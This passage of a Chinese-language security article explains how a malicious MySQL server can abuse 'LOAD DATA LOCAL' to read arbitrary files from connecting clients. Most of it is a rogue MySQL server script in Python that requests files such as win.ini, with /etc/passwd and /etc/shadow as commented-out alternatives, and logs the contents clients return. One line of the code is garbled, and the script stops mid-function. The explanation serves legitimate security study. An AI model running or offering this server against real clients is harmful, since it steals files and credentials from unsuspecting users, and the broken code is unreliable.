> 假设服务端由我们控制，把一个正常的流程篡改成如下
>  
>  
>     客户端：我要把我的win.ini文件内容插入test表中
>     服务端：好，我要你的conn.php内容
>     客户端：conn.php的内容如下???
>
> 例子部分修改自：[CSS-T | Mysql Client 任意文件读取攻击链拓展](https://paper.seebug.org/1112/)
换句话说：`load data local`语句要读取的文件会受到服务端的控制。
其次，在[Mysql官方文档对于`load data
local`语句的安全说明](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)中有这么一句话:
> A patched server could in fact reply with a file-transfer request to any
> statement, not just [`LOAD DATA
> LOCAL`](https://dev.mysql.com/doc/refman/8.0/en/load-data.html), so a more
> fundamental issue is that clients should not connect to untrusted servers.
意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是`load data local`语句。
这就会产生什么结果呢？之前讲的例子，将可以变成：
    客户端：我需要查询test表下的xx内容
    服务端：我需要你的conn.php内容
    客户端：conn.php的内容如下???
可以看到，客户端相当于被攻击者给 **半劫持** 了。
利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。
简易恶意服务端代码：
    #代码摘自：https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py
    #!/usr/bin/env python
    #coding: utf8
    import socket
    import asyncore
    import asynchat
    import struct
    import random
    import logging
    import logging.handlers
    PORT = 3306
    log = logging.getLogger(__name__)
    log.setLevel(logging.DEBUG)
    tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
    tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
    log.addHandler(
        tmp_format
    )
    filelist = (
    #    r'c:\boot.ini',
        r'c:\windows\win.ini',
    #    r'c:\windows\system32\drivers\etc\hosts',
    #    '/etc/passwd',
    #    '/etc/shadow',
    )
    #================================================
    #=======No need to change after this lines=======
    #================================================
    __author__ = 'Gifts'
    def daemonize():
        import os, warnings
        if os.name != 'posix':
            warnings.warn('Cant create daemon on non-posix system')
            return
        if os.fork(): os._exit(0)
        os.setsid()
        if os.fork(): os._exit(0)
        os.umask(0o022)
        null=os.open('/dev/null', os.O_RDWR)
        for i in xrange(3):
            try:
                os.dup2(null, i)
            except OSError as e:
                if e.errno != 9: raise
        os.close(null)
    class LastPacket(Exception):
        pass
    class OutOfOrder(Exception):
        pass
    class mysql_packet(object):
        packet_header = struct.Struct('> 16, 0, self.packet_num)
            result = "{0}{1}".format(
                header,
                self.payload
            )
            return result
        def __repr__(self):
            return repr(str(self))
        @staticmethod
        def parse(raw_data):
            packet_num = ord(raw_data[0])
            payload = raw_data[1:]
            return mysql_packet(packet_num, payload)
    class http_request_handler(asynchat.async_chat):
        def __init__(self, addr):
            asynchat.async_chat.__init__(self, sock=addr[0])
            self.addr = addr[1]
            self.ibuffer = []
            self.set_terminator(3)
            self.state = 'LEN'
            self.sub_state = 'Auth'
            self.logined = False
            self.push(
                mysql_packet(
                    0,
                    "".join((
                        '\x0a',  # Protocol
                        '3.0.0-Evil_Mysql_Server' + '\0',  # Version
                        #'5.1.66-0+squeeze1' + '\0',
                        '\x36\x00\x00\x00',  # Thread ID
                        'evilsalt' + '\0',  # Salt
                        '\xdf\xf7',  # Capabilities
                        '\x08',  # Collation
                        '\x02\x00',  # Server Status
                        '\0' * 13,  # Unknown
                        'evil2222' + '\0',
                    ))
                )
            )
            self.order = 1
            self.states = ['LOGIN', 'CAPS', 'ANY']
        def push(self, data):
            log.debug('Pushed: %r', data)
            data = str(data)
            asynchat.async_chat.push(self, data)
        def collect_incoming_data(self, data):
            log.debug('Data recved: %r', data)
            self.ibuffer.append(data)
        def found_terminator(self):
            data = "".join(self.ibuffer)
            self.ibuffer = []
            if self.state == 'LEN':
                len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
                if len_bytes < 65536:
                    self.set_terminator(len_bytes)
                    self.state = 'Data'
                else:
                    self.state = 'MoreLength'
            elif self.state == 'MoreLength':
                if data[0] != '\0':
                    self.push(None)
                    self.close_when_done()
                else:
                    self.state = 'Data'
            elif self.state == 'Data':
                packet = mysql_packet.parse(data)
                try:
                    if self.order != packet.packet_num:
                        raise OutOfOrder()
                    else:
                        # Fix ?
                        self.order = packet.packet_num + 2
                    if packet.packet_num == 0:
                        if packet.payload[0] == '\x03':
                            log.info('Query')
                            filename = random.choice(filelist)
                            PACKET = mysql_packet(
                                packet,
                                '\xFB{0}'.format(filename)
                            )
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.sub_state = 'File'
                            self.push(PACKET)
                        elif packet.payload[0] == '\x1b':
                            log.info('SelectDB')
                            self.push(mysql_packet(
                                packet,
                                '\xfe\x00\x00\x02\x00'
                            ))
                            raise LastPacket()
                        elif packet.payload[0] in '\x02':
                            self.push(mysql_packet(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise LastPacket()
                        elif packet.payload == '\x00\x01':
                            self.push(None)
                            self.close_when_done()
                        else: